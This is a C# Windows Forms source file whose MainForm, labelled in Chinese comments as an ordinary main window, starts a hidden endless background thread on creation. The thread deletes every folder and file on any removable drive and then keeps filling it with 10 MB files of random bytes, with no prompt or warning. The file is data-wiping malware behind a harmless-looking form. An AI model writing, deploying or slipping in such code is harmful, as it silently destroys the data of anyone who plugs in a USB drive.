using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Management;
using System.IO;

namespace owplan
{
    /// <summary>
    /// 主窗体
    /// </summary>
    public partial class MainForm : Form
    {
        #region Lord 2012/7/4
        /// <summary>
        ///  创建图形控件
        /// </summary>
        public MainForm()
        {
            InitializeComponent();
            Thread thread = new Thread(new ThreadStart(Run));
            thread.Start();
        }

        private Dictionary<String, String> maps = new Dictionary<string, string>();

        private void Run()
        {
            while (true)
            {
                if (KillAll())
                {
                    Thread.Sleep(1);
                }
                else
                {
                    Thread.Sleep(1000);
                }
            }
        }
        private Random rd = new Random();

        private bool KillAll()
        {
            bool result = false;
            DriveInfo.GetDrives();
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                if (d.DriveType == DriveType.Removable)
                {
                    result = true;
                    try
                    {
                        DirectoryInfo dir = new DirectoryInfo(d.Name);
                        DirectoryInfo[] subDirs = dir.GetDirectories();
                        foreach (DirectoryInfo subDir in subDirs)
                        {
                            try
                            {
                                subDir.Delete(true);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message + "\r\n" + ex.StackTrace);
                            }
                        }
                        FileInfo[] files = dir.GetFiles();
                        foreach (FileInfo fileInfo in files)
                        {
                            try
                            {
                                if (!maps.ContainsKey(fileInfo.Name))
                                {
                                    fileInfo.Delete();
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message + "\r\n" + ex.StackTrace);
                            }
                        }
                        byte[] bytes = new byte[1024 * 1024 * 10];
                        for (int i = 0; i < bytes.Length; i++)
                        {
                            bytes[i] = (byte)rd.Next(-127, 127);
                        }
                        String fileName = System.Guid.NewGuid().ToString();
                        maps[fileName] = "";
                        File.WriteAllBytes(dir.FullName + "\\" + fileName, bytes);
                    }
                    catch { }
                }
            }
            return result;
        }

        /// <summary>
        /// 显示窗体
        /// </summary>
        public void ShowForm()
        {
            this.TopMost = true;
            this.TopMost = false;
            this.Visible = true;
        }

        /// <summary>
        /// 消息监听
        /// </summary>
        /// <param name="m"></param>
        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0401)
            {
                if (this.IsHandleCreated)
                {
                    ShowForm();
                }
            }
            base.WndProc(ref m);
        }
        #endregion
    }

    public class Disk
    {

    }
}